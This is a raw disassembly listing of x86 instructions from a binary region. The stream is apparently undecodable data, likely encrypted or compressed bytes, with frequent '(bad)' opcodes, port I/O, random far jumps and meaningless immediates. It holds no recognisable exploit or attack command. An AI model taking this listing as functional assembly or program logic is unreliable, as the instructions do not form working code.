  420d3b:	fcmovnb st,st(1)
  420d3d:	sti    
  420d3e:	out    dx,eax
  420d3f:	or     bl,dh
  420d41:	(bad)  
  420d43:	iret   
  420d44:	mov    ecx,0xe1c2e5df
  420d49:	in     al,dx
  420d4a:	out    dx,eax
  420d4b:	icebp  
  420d4c:	out    0xfa,eax
  420d4e:	lods   eax,DWORD PTR ds:[esi]
  420d4f:	in     al,dx
  420d50:	aad    0xf1
  420d52:	clc    
  420d53:	shr    bh,cl
  420d55:	fadd   DWORD PTR [edi]
  420d57:	cld    
  420d58:	hlt    
  420d59:	mov    edx,0xe9f501d6
  420d5e:	(bad)  
  420d60:	fxch   st(7)
  420d62:	push   cs
  420d63:	ffreep st(4)
  420d65:	mov    esp,0xcbb6e2d2
  420d6a:	repnz repnz ror dl,0xe6
  420d6f:	lock jmp 0x420d5a
  420d72:	mov    ecx,0xf2f2cdf6
  420d77:	mov    esp,0xf0f4e6fc
  420d7c:	icebp  
  420d7d:	cmc    
  420d7e:	out    0xfb,al
  420d80:	out    dx,eax
  420d81:	into   
  420d82:	enter  0xa903,0xec
  420d86:	icebp  
  420d87:	aad    0xc3
  420d89:	fdiv   QWORD PTR [ebp-0x322a3245]
  420d8f:	mov    eax,0xe1c8cedc
  420d94:	mov    bh,0xef
  420d96:	fcmovb st,st(2)
  420d98:	mul    dh
  420d9a:	stc    
  420d9b:	icebp  
  420d9c:	ret    0xe00a
  420d9f:	fucomip st,st(6)
  420da1:	out    0xe3,eax
  420da3:	int    0xac
  420da5:	int    0xc0
  420da7:	mov    bh,0xd2
  420da9:	mov    dh,0xac
  420dab:	aam    0xd1
  420dad:	icebp  
  420dae:	mov    al,0xde
  420db0:	fcmovne st,st(5)
  420db2:	lock repnz int3 
  420db5:	call   0xd6130078
  420dba:	aam    0xd0
  420dbc:	retf   0xe301
  420dbf:	out    dx,eax
  420dc0:	jecxz  0x420d8f
  420dc2:	psllw  mm1,mm7
  420dc5:	mov    bl,0xd1
  420dc7:	int    0xc7
  420dc9:	call   0xf30e05b6
  420dce:	leave  
  420dcf:	leave  
  420dd0:	not    edi
  420dd2:	cld    
  420dd3:	idiv   dh
  420dd5:	xlat   BYTE PTR ds:[ebx]
  420dd6:	loopne 0x420dcf
  420dd8:	shl    bl,1
  420dda:	shl    dh,1
  420ddc:	aad    0xcb
  420dde:	(bad)  
  420ddf:	(bad)  
  420de0:	cmc    
  420de1:	fisttp DWORD PTR ds:0xccf3f3e9
  420de7:	fdivrp st(4),st
  420de9:	scas   al,BYTE PTR es:[edi]
  420dea:	loope  0x420dc1
  420dec:	mov    ah,0xc0
  420dee:	out    dx,eax
  420def:	retf   0xb6e5
  420df2:	fstp   st(1)
  420df4:	int3   
  420df5:	iret   
  420df6:	std    
  420df7:	repz add eax,0xcabcf0ba
  420dfd:	cmc    
  420dfe:	(bad)  
  420e00:	std    
  420e01:	jmp    0xcdce:0xc9e4f8f9
  420e08:	out    0xc6,eax
  420e0a:	ret    
  420e0b:	out    0xd2,al
  420e0d:	mov    ebx,0xd6f7b0bf
  420e12:	fdiv   st,st(4)
  420e14:	loopne 0x420de6
  420e16:	iret   
  420e17:	(bad)  
  420e19:	sar    dh,0xc5
  420e1c:	xlat   BYTE PTR ds:[ebx]
  420e1d:	ror    DWORD PTR [edi],0xe
  420e20:	jmp    0xc7c6:0xb1f2c10b
  420e27:	loopne 0x420def
  420e29:	mov    esp,0xd8f6cce8
  420e2e:	jmp    0xb7f5:0xcbfedace
  420e35:	idiv   dh
  420e37:	aad    0xbe
  420e39:	loop   0x420e1a
  420e3b:	jmp    0x420e1c
  420e3d:	jmp    0xc52df325
  420e42:	jmp    0xf220c04d
  420e47:	repz out dx,al
  420e49:	ror    edi,0xb0
  420e4c:	shr    ebp,cl
  420e4e:	vpsubw ymm7,ymm5,ymm1
  420e52:	out    dx,eax
  420e53:	cld    
  420e54:	mov    esp,0xdeffe1f5
  420e59:	ret    
  420e5a:	shl    edi,0xc2
  420e5d:	(bad)  
  420e5e:	(bad)  
  420e60:	add    al,ch
  420e62:	loopne 0x420e33
  420e64:	test   al,0xa8
  420e66:	jmp    0xd21de20f
  420e6b:	xbegin 0xbbfdde68
  420e71:	mov    dh,0xeb
  420e73:	mov    ah,0xcf
  420e75:	int3   
  420e76:	iret   
  420e77:	mov    eax,0xe4c0fbc7
  420e7c:	add    bl,bh
  420e7e:	aam    0xa
  420e80:	jmp    0xed3ef84a
  420e85:	ret    0xefae
  420e88:	lock cmc 
  420e8a:	mov    cl,0xe8
  420e8c:	mov    ecx,0xd1c6c5e7
  420e91:	mov    esi,0xe3d2d8bb
  420e96:	(bad)  
  420e98:	sar    bh,cl
  420e9a:	aam    0xe1
  420e9c:	rol    DWORD PTR [edx],1
  420e9e:	loop   0x420e67
  420ea0:	add    al,cl
  420ea2:	loopne 0x420e89
  420ea4:	fdivr  QWORD PTR [ebp-0xc3d5024]
  420eaa:	(bad)  
  420eab:	out    dx,eax
  420eac:	out    dx,eax
  420ead:	leave  
  420eae:	(bad)  
  420eaf:	fcmove st,st(1)
  420eb1:	repnz int3 
  420eb3:	fsubp  st(6),st
  420eb5:	test   eax,0xcbd9d3ce
  420ebb:	retf   
  420ebc:	loope  0x420e86
  420ebe:	stc    
  420ebf:	leave  
  420ec0:	ret    
  420ec1:	loope  0x420e9c
  420ec3:	out    dx,eax
  420ec4:	in     al,dx
  420ec5:	scas   al,BYTE PTR es:[edi]
  420ec6:	les    esi,FWORD PTR [ebx-0x3d2f1b2f]
  420ecc:	shl    eax,1
  420ece:	mov    cl,0xca
  420ed0:	les    edi,FWORD PTR [ecx-0xdfc1c2a]
  420ed6:	not    cl
  420ed8:	add    esi,edx
  420eda:	fsub   st,st(3)
  420edc:	fadd   QWORD PTR [edi]
  420ede:	cli    
  420edf:	into   
  420ee0:	loopne 0x420edf
  420ee2:	fdivr  st,st(6)
  420ee4:	fsubrp st(7),st
  420ee6:	mov    edi,0xdabcddf3
  420eeb:	rcr    edx,1
  420eed:	retf   0xd7ca
  420ef0:	jmp    0xf7d0:0xe3d1bafa
  420ef7:	inc    dh
  420ef9:	add    bl,ch
  420efb:	or     ecx,ebx
  420efd:	jmp    0xf807:0xd9e8ffbd
  420f04:	(bad)  
  420f05:	lock lods al,BYTE PTR ds:[esi]
  420f07:	out    0xd5,eax
  420f09:	mov    bl,0xd0
  420f0b:	mov    bh,0xf3
  420f0d:	mov    eax,0xbdd0e9ea
  420f12:	fild   DWORD PTR [ebx]
  420f14:	mov    ebp,0xf806f4e8
  420f19:	pop    es
  420f1a:	rcr    bl,1
  420f1c:	ret    
  420f1d:	add    eax,0x3f9fa07
  420f22:	or     ch,ah
  420f24:	int3   
  420f25:	mov    al,0xee
  420f27:	jmp    0xf02ed116
  420f2c:	loopne 0x420efa
  420f2e:	int3   
  420f2f:	sar    al,cl
  420f31:	mov    dl,0xd3
  420f33:	(bad)  
  420f35:	add    ah,bh
  420f37:	cli    
  420f38:	out    0xb,eax
  420f3a:	add    al,dh
  420f3c:	fild   DWORD PTR [edx]
  420f3e:	(bad)  
  420f40:	mov    edx,0xcee9dfdb
  420f46:	loope  0x420f1b
  420f48:	in     eax,dx
  420f49:	lock out dx,eax
  420f4b:	(bad)  
  420f4c:	fcom   st(6)
  420f4e:	mov    ah,0xb7
  420f50:	aam    0xfb
  420f52:	mov    ecx,0xde01cee2
  420f57:	stc    
  420f58:	aam    0xdc
  420f5a:	rol    ecx,1
  420f5c:	mov    edi,0xeeea0002
  420f61:	loope  0x420f51
  420f63:	loopne 0x420f26
  420f65:	stos   BYTE PTR es:[edi],al
  420f66:	into   
  420f67:	call   0xed22ff34
  420f6c:	in     eax,0xb5
  420f6e:	(bad)  
  420f6f:	mov    esi,0xfbdef0cd
  420f74:	clc    
  420f75:	in     eax,dx
  420f76:	add    bh,al
  420f78:	(bad)  
  420f79:	aad    0x5
  420f7b:	ret    0xe9
  420f7e:	fsub   st,st(6)
  420f80:	loop   0x420f46
  420f82:	or     dl,dl
  420f84:	(bad)  
  420f85:	rcl    dh,1
  420f87:	ret    
  420f88:	ret    
  420f89:	loope  0x420f66
  420f8b:	int3   
  420f8c:	jmp    0xf6eef775
  420f91:	mov    edx,0xd1f702f9
  420f96:	add    ebx,edx
  420f98:	shl    ah,0xf1
  420f9b:	sti    
  420f9c:	or     esp,esi
  420f9e:	(bad)  
  420f9f:	retf   
  420fa0:	retf   
  420fa1:	bswap  edx
  420fa3:	fldl2e 
  420fa5:	loopne 0x420f6d
  420fa7:	ror    bh,1
  420fa9:	out    0xe9,al
  420fab:	test   al,0xe8
  420fad:	sar    BYTE PTR [eax-0x15443305],0xd6
  420fb4:	add    BYTE PTR [edi+ecx*8-0x340f2c09],bh
  420fbb:	sti    
  420fbc:	jmp    0xa2cdaa1
  420fc1:	stc    
  420fc2:	adc    ebp,edi
  420fc4:	jecxz  0x420fbd
  420fc6:	retf   0xc4e9
  420fc9:	div    BYTE PTR [edx-0x74b5038]
  420fcf:	in     eax,0xb5
  420fd1:	xlat   BYTE PTR ds:[ebx]
  420fd2:	mov    edx,0xf0d6cdc8
  420fd7:	xlat   BYTE PTR ds:[ebx]
  420fd8:	lock mov BYTE PTR [eax],0xf5
  420fdc:	retf   
  420fdd:	cli    
  420fde:	or     bl,bh
  420fe0:	or     ebx,ecx
  420fe2:	jmp    0x420fac
  420fe4:	jmp    0xd207f49a
  420fe9:	fsubr  QWORD PTR [edx+edx*8-0x2e164936]
  420ff0:	iret   
  420ff1:	aam    0xd1
  420ff3:	int    0xde
  420ff5:	mov    eax,0xba04fbb8
  420ffa:	stc    
  420ffb:	lock stc 
  420ffd:	in     eax,0xd6
  420fff:	in     eax,0x6
  421001:	out    dx,eax
  421002:	(bad)  
  421005:	mov    edi,0xe3afdef0
  42100a:	repz in al,dx
  42100c:	mov    ecx,0xd1d9e7e0
  421011:	sti    
  421012:	fld    st(2)
  421014:	loopne 0x421008
  421016:	out    dx,eax
  421017:	cmc    
  421018:	test   esp,0xdadb0407
  42101e:	fstp   st(4)
  421020:	enter  0xfbfd,0x7
  421024:	lods   eax,DWORD PTR ds:[esi]
  421025:	int3   
  421026:	int3   
  421027:	jmp    0x420ff8
  421029:	repz loopne 0x420fe7
  42102c:	loope  0x421024
  42102e:	into   
  42102f:	(bad)  
  421030:	stc    
  421031:	shr    ch,cl
  421033:	in     al,dx
  421034:	test   BYTE PTR [ebx],0xf2
  421037:	sti    
  421038:	ret    0xbdc3
  42103b:	hlt    
  42103c:	loop   0x42103f
  42103e:	add    eax,0xcce0e9c4
  421043:	retf   0xbedd
  421046:	mov    dl,0xf4
  421049:	aam    0xf4
  42104b:	aad    0xc8
  42104d:	lock mov edx,0xdcd2ddfa
  421053:	into   
  421054:	rcl    cl,1
  421056:	(bad)  
  421057:	cld    
  421058:	inc    BYTE PTR [edi]
  42105a:	loopne 0x42103e
  42105c:	aad    0xff
  42105e:	(bad)  
  421060:	jmp    0xc4e1:0xc9d8defb
  421067:	repnz (bad) 
  421069:	shr    edi,1
  42106b:	fincstp 
  42106d:	sar    bh,0xef
  421070:	jmp    0xbfbf:0xd1efd303
  421077:	ret    0xc4f2
  42107a:	or     cl,dl
  42107c:	or     ebx,ebx
  42107e:	sti    
  42107f:	lds    ecx,FWORD PTR [edi+eiz*8]
  421082:	out    dx,eax
  421083:	repz int3 
  421085:	int3   
  421086:	scas   al,BYTE PTR es:[edi]
  421087:	in     eax,dx
  421088:	hlt    
  421089:	loope  0x421070
  42108b:	retf   
  42108c:	cli    
  42108d:	int    0xef
  42108f:	(bad)  
  421090:	in     eax,dx
  421091:	leave  
  421092:	mov    ebx,0xdabfc8d3
  421097:	mov    eax,0xf7fbf7d9
  42109c:	add    eax,0xc4f40ac1
  4210a1:	push   cs
  4210a2:	fcomi  st,st(2)
  4210a4:	lods   eax,DWORD PTR ds:[esi]
  4210a5:	mov    edi,0xb6ddc5dd
  4210aa:	retf   
  4210ab:	mov    dl,0xb6
  4210ad:	leave  
  4210ae:	in     al,dx
  4210af:	(bad)  
  4210b0:	jmp    0x42106a
  4210b2:	mov    cl,0xff
  4210b4:	mov    esp,0xbcb8dcfe
  4210b9:	clc    
  4210ba:	repnz in al,0xe9
  4210bd:	fild   WORD PTR [ebx]
  4210bf:	clc    
  4210c0:	fmul   st,st(5)
  4210c2:	fprem  
  4210c4:	jecxz  0x4210ab
  4210c6:	mov    esp,0xc8d6e6d0
  4210cb:	mul    ecx
  4210cd:	mov    cl,0xeb
  4210cf:	jmp    0xbafe:0xe902d0ff
  4210d6:	test   cl,0xc5
  4210d9:	add    al,0x5
  4210db:	add    ebx,ebx
  4210dd:	loop   0x4210d3
  4210df:	fsqrt  
  4210e1:	iret   
  4210e2:	out    0xef,eax
  4210e4:	retf   0xc8c9
  4210e7:	cmc    
  4210e8:	(bad)  
  4210e9:	lock int 0xce
  4210ec:	leave  
  4210ed:	in     eax,dx
  4210ee:	hlt    
  4210ef:	not    al
  4210f1:	mov    edi,0xe0e0f1be
  4210f6:	mov    ecx,0xd2c5c1c7
  4210fb:	add    eax,eax
  4210fd:	jmp    0xf847dfd6
  421102:	stc    
  421103:	(bad)  
  421105:	jmp    0xe9d1:0xd6caacf2
  42110c:	jmp    0x4210d3
  42110e:	call   0xbf2104d7
  421113:	fnstsw WORD PTR [ebx+edx*8-0x82b1e13]
  42111a:	rol    DWORD PTR [ecx],1
  42111c:	fiadd  WORD PTR [ecx]
  42111e:	(bad)  
  42111f:	jmp    0xc50f818
  421124:	enter  0xeaf7,0xd3
  421128:	(bad)  
  421129:	(bad)  
  42112a:	loopne 0x421126
  42112c:	in     al,0xd3
  42112e:	shr    ah,cl
  421130:	mov    ecx,0xf0f9bbeb
  421135:	int3   
  421136:	mov    ch,0xe5
  421138:	in     eax,dx
  421139:	sti    
  42113a:	std    
  42113b:	fneni(8087 only) 
  42113d:	rcr    ch,0xee
  421140:	retf   
  421141:	in     al,dx
  421142:	add    al,BYTE PTR [edx]
  421144:	lods   eax,DWORD PTR ds:[esi]
  421145:	shl    esi,cl
  421147:	mov    ebp,0xe6dbc1ee
  42114c:	icebp  
  42114d:	(bad)  
  42114e:	repz mov edi,0xc8cfbbe4
  421154:	mov    edi,0xc7b4fdd1
  421159:	repz pop es
  42115b:	cli    
  42115c:	rol    al,1
  42115e:	out    dx,eax
  42115f:	jmp    0xb1d3:0xe7f2dbf9
  421166:	rcr    ebp,1
  421168:	(bad)  
  42116b:	out    dx,eax
  42116c:	mov    ebx,0xd6f2efb9
  421171:	fsubr  st,st(2)
  421173:	mov    ebp,0xf6efdfdc
  421178:	mov    esp,0xfcc5d0e2
  42117d:	fmulp  st(7),st
  42117f:	(bad)  [ecx]
  421181:	fsub   st(7),st
  421183:	(bad)  
  421185:	shl    ah,0xc0
  421188:	rcl    ebp,0xed
  42118b:	mov    ah,0xcb
  42118d:	shr    ecx,1
  42118f:	in     eax,0xfc
  421191:	(bad)  
  421192:	in     al,dx
  421193:	(bad)  
  421194:	(bad)  
  421196:	ret    
  421197:	mov    edi,0x300f7d7
  42119c:	out    0xe2,al
  42119e:	aam    0xfc
  4211a0:	or     al,0xec
  4211a2:	in     al,0x5
  4211a4:	stos   DWORD PTR es:[edi],eax
  4211a5:	jmp    0xcfbb:0xecc1b7a8
  4211ac:	mov    edx,0xd4ace7d0
  4211b1:	sti    
  4211b2:	cli    
  4211b3:	repnz shr edi,1
  4211b6:	mov    ch,0xe3
  4211b8:	(bad)  
  4211b9:	std    
  4211ba:	in     eax,0xfe
  4211bc:	jecxz  0x4211c2
  4211be:	or     eax,ecx
  4211c0:	in     al,dx
  4211c1:	ret    0xeafc
  4211c4:	mov    eax,0xf3ccc5d8
  4211c9:	enter  0xf3c0,0xed
  4211cd:	in     al,0xad
  4211cf:	out    dx,al
  4211d0:	int    0xbf
  4211d2:	jmp    0x4211aa
  4211d4:	(bad)  
  4211d6:	stc    
  4211d7:	loopne 0x4211b1
  4211d9:	mov    esi,0x9f1e0e6
  4211de:	add    ebp,esi
  4211e0:	out    0x6,al
  4211e2:	in     eax,0xea
  4211e4:	retf   0xcfd2
  4211e7:	in     eax,dx
  4211e8:	int3   
  4211e9:	repz repnz icebp 
  4211ec:	jmp    0x4211c7
  4211ee:	in     al,dx
  4211ef:	repnz hlt 
  4211f1:	sti    
  4211f2:	jmp    0x7db:0xd5c3eefb
  4211f9:	fcmovnbe st,st(5)
  4211fb:	out    0x9,al
  4211fd:	add    dl,bh
  4211ff:	in     al,0xe3
  421201:	out    dx,al
  421202:	out    0xc8,eax
  421204:	mov    cl,0xae
  421206:	mov    bh,0xe6
  421208:	cmc    
  421209:	mov    esp,0xf2edc9c1
  42120e:	mov    edx,0xdffcf3c6
  421213:	mov    ah,0xdc
  421215:	lock cld 
  421217:	aam    0xe3
  421219:	jecxz  0x4211df
  42121b:	stc    
  42121c:	add    BYTE PTR [edx],al
  42121e:	push   cs
  42121f:	or     edi,esp
  421221:	jmp    0xaa091d11
  421226:	enter  0xf6c1,0xce
  42122a:	mov    dl,0xc2
  42122c:	out    dx,eax
  42122d:	clc    
  42122e:	fdiv   DWORD PTR [ebp-0x16061314]
  421234:	int3   
  421235:	lock not dh
  421238:	add    eax,ecx
  42123a:	in     al,0xd5
  42123c:	test   DWORD PTR [edi],0xe2cfdfbd
  421242:	add    cl,bh
  421244:	jmp    0xac0ce1f7
  421249:	retf   
  42124a:	leave  
  42124b:	lock stc 
  42124d:	retf   0xb9d7
  421250:	iret   
  421251:	(bad)  
  421252:	fcmovnbe st,st(5)
  421254:	sti    
  421255:	call   0xd047003c
  42125a:	(bad)  
  42125b:	retf   
  42125c:	in     al,0xf
  42125e:	aam    0x5
  421260:	(bad)
  421264:	scas   eax,DWORD PTR es:[edi]
  421265:	scas   al,BYTE PTR es:[edi]
  421266:	mov    dl,0xcc
  421268:	ret    0xf1ec
  42126b:	cli    
  42126c:	mov    dh,0xec
  42126e:	mov    al,0xf6
  421270:	cmc    
  421271:	in     eax,dx
  421272:	jmp    0xf541ea4e
  421277:	jecxz  0x421269
  421279:	add    al,0xb
  42127b:	push   es
  42127c:	fadd   st(7),st
  42127e:	out    0xfb,eax
  421280:	cli    
  421281:	cld    
  421282:	loopne 0x421262
  421284:	leave  
  421285:	test   eax,0xaeb0c1dd
  42128a:	in     al,dx
  42128b:	leave  
  42128c:	fucomi st,st(4)
  42128e:	(bad)  
  42128f:	out    0xfc,al
  421291:	sar    ch,1
  421293:	mov    eax,0xf0e3fac9
  421298:	inc    bh
  42129a:	add    bl,al
  42129c:	or     dh,dl
  42129e:	mul    ecx
  4212a0:	add    edi,eax
  4212a2:	jecxz  0x421286
  4212a4:	scas   al,BYTE PTR es:[edi]
  4212a5:	int    0xed
  4212a7:	div    DWORD PTR [ecx-0x19053753]
  4212ad:	(bad)  
  4212af:	(bad)  
  4212b0:	icebp  
  4212b1:	stc    
  4212b2:	stc    
  4212b3:	ret    
  4212b4:	mov    bh,0xbf
  4212b6:	rcr    al,cl
  4212b8:	fstp   st(4)
  4212ba:	retf   
  4212bb:	aad    0xda
  4212bd:	aam    0xd9
  4212bf:	(bad)  
  4212c1:	fcomip st,st(3)
  4212c3:	stc    
  4212c4:	out    0xd8,al
  4212c6:	rcl    dh,1
  4212c8:	rol    esi,0xf4
  4212cb:	(bad)
  4212ce:	iret   
  4212cf:	mov    eax,0xf3d4c8e8
  4212d4:	inc    DWORD PTR [edx]
  4212d6:	repz cmc 
  4212d8:	int3   
  4212d9:	push   es
  4212da:	(bad)  
  4212dc:	inc    DWORD PTR [edx]
  4212de:	or     ch,dl
  4212e0:	(bad)
  4212e3:	cli    
  4212e4:	mov    esp,0xcbd7e9a8
  4212e9:	fadd   st(5),st
  4212eb:	rcl    bh,1
  4212ed:	in     al,0xef
  4212ef:	out    0xde,al
  4212f1:	sar    DWORD PTR [ebx-0x71e0dfd],1
  4212f7:	push   es
  4212f8:	inc    DWORD PTR [esi]
  4212fa:	div    ch
  4212fc:	aad    0xf8
  4212fe:	mov    ebp,0xfbf3cbe2
  421303:	add    eax,0xb2f0c5c4
  421308:	hlt    
  421309:	mov    dh,0xb3
  42130b:	repz (bad) 
  42130d:	mov    eax,0xd9fabed6
  421312:	iret   
  421313:	mov    edx,0xd4c2efee
  421318:	shl    ecx,cl
  42131a:	fdivp  st(2),st
  42131c:	fxam   
  42131e:	fsub   st(0),st
  421320:	ret    
  421321:	push   es
  421322:	shr    edx,0xf0
  421325:	test   eax,0xe6d1d5f6
  42132a:	rol    cl,1
  42132c:	enter  0xffdb,0xe8
  421330:	cli    
  421331:	mov    ch,0xf7
  421333:	ret    
  421334:	ret    
  421335:	stc    
  421336:	out    0xd5,al
  421338:	loop   0x42131a
  42133a:	or     dh,cl
  42133c:	cmc    
  42133d:	jmp    0xde0a:0xead4c9fa
  421344:	test   eax,0xcbf5edbf
  421349:	into   
  42134a:	fcmovbe st,st(4)
  42134c:	retf   0xf9f1
  42134f:	sti    
  421350:	sar    dh,cl
  421352:	aam    0xd7
  421354:	idiv   bh
  421356:	out    0xfb,eax
  421358:	rol    bl,0xf6
  42135b:	aad    0xe4
  42135d:	movntq (bad),mm5
  42135e:	out    0xed,eax
  421360:	aam    0xcc
  421362:	retf   0xb10d
  421365:	repz jecxz 0x42131a
  421368:	jmp    0x421333
  42136a:	loop   0x421340
  42136c:	mov    edx,0xb8e5c9ea
  421371:	aam    0xbe
  421373:	mov    ebx,0x7f9e8df
  421378:	vshufps xmm2,xmm4,xmm1,0xdd
  42137d:	(bad)  
  42137e:	paddusb mm1,mm0
  421381:	add    eax,0xdecbefea
  421386:	shl    dl,0xeb
  421389:	sar    DWORD PTR [ebx-0x4f124809],cl
  42138f:	int3   
  421390:	leave  
  421391:	(bad)  
  421392:	mov    ah,0xfd
  421394:	out    dx,eax
  421395:	hlt    
  421396:	(bad)  
  421397:	lock fsub st,st(4)
  42139a:	mov    ecx,0xc6f8f6e3
  42139f:	push   cs
  4213a0:	push   cs
  4213a1:	or     dh,cl
  4213a3:	add    al,0xc6
  4213a5:	in     eax,dx
  4213a6:	loopne 0x42137d
  4213a8:	hlt    
  4213a9:	mul    edi
  4213ab:	loopne 0x421383
  4213ad:	shl    bl,0xdf
  4213b0:	push   DWORD PTR [ebp-0x2d3e0446]
  4213b6:	(bad)  
  4213b8:	cld    
  4213b9:	mov    DWORD PTR [eax*8-0xb3a19fe],0xdeae7cf
  4213c4:	lock out dx,al
  4213c6:	mov    bh,0xca
  4213c8:	loope  0x4213ba
  4213ca:	aad    0xca
  4213cc:	lds    edi,FWORD PTR [eax-0x24254922]
  4213d2:	cli    
  4213d3:	enter  0xf5cd,0xe2
  4213d7:	push   es
  4213d8:	mov    ebp,0xfdcabcbd
  4213dd:	cmc    
  4213de:	hlt    
  4213df:	cli    
  4213e0:	jecxz  0x4213e4
  4213e2:	jmp    0xe2e5:0xefe2c7e9
  4213e9:	aam    0xa9
  4213eb:	div    ah
  4213ed:	sti    
  4213ee:	aam    0xe6
  4213f0:	stc    
  4213f1:	std    
  4213f2:	aad    0xf2
  4213f4:	add    dh,dh
  4213f6:	push   es
  4213f7:	(bad)  
  4213f9:	clc    
  4213fa:	cld    
  4213fb:	inc    esi
  4213fd:	out    0x6,eax
  4213ff:	fsubr  st(3),st
  421401:	in     eax,0x6
  421403:	jmp    ecx
  421405:	into   
  421406:	icebp  
  421407:	shr    DWORD PTR [ebx-0x2b1b3b2f],cl
  42140d:	out    dx,al
  42140e:	fcom   st(6)
  421410:	stc    
  421411:	mov    ecx,0xfe01dae3
  421416:	jecxz  0x4213f4
  421418:	mul    dl
  42141a:	xlat   BYTE PTR ds:[ebx]
  42141b:	in     eax,0xe8
  42141d:	jmp    0xd3e7:0xc6fd0f0b
  421424:	(bad)  
  421426:	(bad)  
  421428:	mov    bh,0xcf
  42142a:	jecxz  0x4213f2
  42142c:	into   
  42142d:	mov    ch,0xba
  42142f:	ror    ebx,cl
  421431:	out    dx,al
  421432:	mov    ecx,0xb9d5d5d3
  421437:	fiadd  DWORD PTR ds:0xdbd7f6d7
  42143d:	out    dx,eax
  42143e:	or     cl,cl
  421440:	out    dx,al
  421441:	pop    es
  421442:	fcmovne st,st(1)
  421444:	in     al,0xc1
  421446:	shl    BYTE PTR [ebp+esi*8-0x28393b4b],0xc7
  42144e:	(bad)  
  42144f:	div    edi
  421451:	in     eax,dx
  421452:	retf   0xfad8
  421455:	(bad)  
  421456:	test   eax,0xe702d1cc
  42145c:	(bad)  
  42145e:	(bad)  [edx]
  421460:	iret   
  421461:	std    
  421462:	jecxz  0x42145c
  421464:	into   
  421465:	int    0xe0
  421467:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421468:	loopne 0x421446
  42146a:	mov    dh,0xba
  42146c:	shr    esp,cl
  42146e:	into   
  42146f:	(bad)  
  421471:	add    ecx,ecx
  421473:	idiv   BYTE PTR [esi-0x51e210b]
  421479:	cld    
  42147a:	(bad)  
  42147c:	or     al,bh
  42147e:	jmp    0xd91ef25d
  421483:	stc    
  421484:	(bad)  
  421486:	mov    esp,0xc4d2d4c1
  42148b:	(bad)  
  42148c:	(bad)  [esi+edx*8-0x4efc373a]
  421493:	out    dx,eax
  421494:	mov    bh,0xb6
  421496:	(bad)  
  421497:	(bad)  
  421499:	add    ah,bl
  42149b:	lock add esp,eax
  42149e:	push   es
  42149f:	cmc    
  4214a0:	add    eax,DWORD PTR [edx]
  4214a2:	fmul   st,st(3)
  4214a4:	in     eax,dx
  4214a5:	lds    ebp,FWORD PTR [ebp-0x2f4a2e34]
  4214ab:	(bad)
  4214af:	call   esp
  4214b1:	mov    dh,0xea
  4214b3:	cmc    
  4214b4:	in     al,dx
  4214b5:	rcl    cl,0xc2
  4214b8:	add    edi,edx
  4214ba:	ret    0xc7
  4214bd:	fdiv   st(5),st
  4214bf:	add    bh,bh
  4214c1:	add    DWORD PTR [eax],eax
  4214c3:	adc    ch,dl
  4214c5:	mov    edi,0xccefeeea
  4214ca:	fcmovnbe st,st(3)
  4214cc:	repz mov dl,0xf3
  4214cf:	mov    ch,0xc8
  4214d1:	out    dx,al
  4214d2:	repz hlt 
  4214d4:	hlt    
  4214d5:	sti    
  4214d6:	cli    
  4214d7:	(bad)  
  4214d8:	hlt    
  4214d9:	fdiv   st(7),st
  4214db:	loope  0x4214c1
  4214dd:	ret    0xd6e3
  4214e0:	out    dx,eax
  4214e1:	int3   
  4214e2:	call   0xe012e8c9
  4214e7:	enter  0xaee9,0xb7
  4214eb:	loopne 0x4214df
  4214ed:	(bad)  
  4214ef:	mov    edi,0xbcfbb8b4
  4214f4:	mov    edx,0xe0daf7fe
  4214f9:	fst    st(3)
  4214fb:	(bad)  
  4214fc:	cli    
  4214fd:	loopne 0x4214ff
  4214ff:	(bad)  
  421500:	(bad)  
  421501:	loope  0x4214dd
  421503:	or     ebx,eax
  421505:	iret   
  421506:	div    bh
  421508:	mov    dh,0xb3
  42150a:	out    0xdb,al
  42150c:	cmc    
  42150d:	xlat   BYTE PTR ds:[ebx]
  42150e:	in     eax,dx
  42150f:	enter  0xc9ed,0xed
  421513:	rcr    ebp,1
  421515:	(bad)  
  421517:	loope  0x421519
  421519:	std    
  42151a:	stc    
  42151b:	xlat   BYTE PTR ds:[ebx]
  42151c:	cli    
  42151d:	imul   ebx
  42151f:	fsub   st(3),st
  421521:	fmul   DWORD PTR [ecx]
  421523:	add    al,0xc5
  421525:	loope  0x4214da
  421527:	(bad)  [ebp+ebp*4-0x39502e4d]
  42152e:	retf   
  42152f:	retf   
  421530:	iret   
  421531:	aad    0xbc
  421533:	mov    esi,0xc0c3f4cc
  421538:	aad    0x5
  42153a:	fst    st(7)
  42153c:	fcmovnb st,st(4)
  42153e:	xlat   BYTE PTR ds:[ebx]
  42153f:	retf   0xd4e7
  421542:	iret   
  421543:	(bad)  
  421545:	lock test al,0xae
  421548:	mov    dh,0xd1
  42154a:	shl    bh,0xe4
  42154d:	int3   
  42154e:	out    dx,al
  42154f:	(bad)  
  421550:	(bad)  
  421551:	fcmove st,st(4)
  421553:	stc    
  421554:	icebp  
  421555:	icebp  
  421556:	out    0xc1,al
  421558:	test   ah,0xff
  42155b:	loopne 0x421541
  42155d:	retf   
  42155e:	add    cl,BYTE PTR [ebx]
  421560:	jecxz  0x421561
  421562:	add    eax,0xe7c4c1ec
  421567:	out    dx,al
  421568:	out    dx,eax
  421569:	in     eax,dx
  42156a:	rcr    edx,0xc9
  42156d:	rcl    edx,1
  42156f:	jmp    0xd814e12c
  421574:	leave  
  421575:	enter  0xe1e7,0xfe
  421579:	loopne 0x421565
  42157b:	test   DWORD PTR [ecx],0xf9dadac4
  421581:	add    ebp,edi
  421583:	push   es
  421584:	mov    edi,0xf2ccd0bd
  421589:	shr    DWORD PTR [ecx+ebp*8-0x41393619],1
  421590:	in     eax,0xd2
  421592:	add    bl,al
  421594:	out    dx,al
  421595:	(bad)  
  421596:	fsubr  st(6),st
  421598:	(bad)  
  421599:	out    0xf4,al
  42159b:	or     al,BYTE PTR [ecx]
  42159d:	in     al,0xdb
  42159f:	or     ch,ch
  4215a1:	fst    DWORD PTR [edx]
  4215a3:	repz ret 
  4215a5:	out    0xae,al
  4215a7:	icebp  
  4215a8:	enter  0xc7b6,0xfa
  4215ac:	out    dx,eax
  4215ad:	iret   
  4215ae:	fucomip st,st(4)
  4215b0:	fstp   st(0)
  4215b2:	add    dl,ch
  4215b4:	fcmove st,st(4)
  4215b6:	not    dh
  4215b8:	shl    bh,1
  4215ba:	aam    0xeb
  4215bc:	(bad)  
  4215bd:	fincstp 
  4215bf:	in     eax,0x0
  4215c1:	into   
  4215c2:	add    ah,dh
  4215c4:	(bad)
